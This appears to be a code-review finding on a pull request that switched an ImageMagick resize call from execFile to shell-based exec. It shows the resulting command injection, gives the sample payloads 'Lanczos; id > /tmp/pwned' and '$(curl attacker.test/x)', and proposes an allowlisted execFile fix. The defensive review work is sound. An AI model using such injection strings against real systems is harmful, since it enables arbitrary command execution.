findings.body:
**Issue:** `exec()` runs the command through a shell, and `src` / `filter` are interpolated directly into that string. The comment and PR text say filters are user-composed, so any caller-supplied value becomes shell syntax.

**Failure mode:** `filter` is unquoted, so a value such as `Lanczos; id > /tmp/pwned` or `$(curl attacker.test/x)` executes arbitrary commands. `src` is only double-quoted, so `"`, `$()`, and backticks still break out or expand. This replaces the previous safe `execFile` argv form.

**Fix:** Keep a non-shell spawn and pass arguments as a list; allowlist filter names if they are user-facing:

```ts
import { execFile } from "child_process";

const ALLOWED = new Set(["Lanczos", "Mitchell", "Catrom", "Point", "Box"]);

export function resize(src: string, filter: string, w: number): Promise<string> {
  if (!ALLOWED.has(filter)) return Promise.reject(new Error("invalid filter"));
  return new Promise((res, rej) => {
    execFile("convert", [src, "-filter", filter, "-resize", `${w}x`, "/tmp/out.png"], (e) =>
      e ? rej(e) : res("/tmp/out.png")
    );
  });
}
```

Do not use `exec` or string concatenation for this boundary.
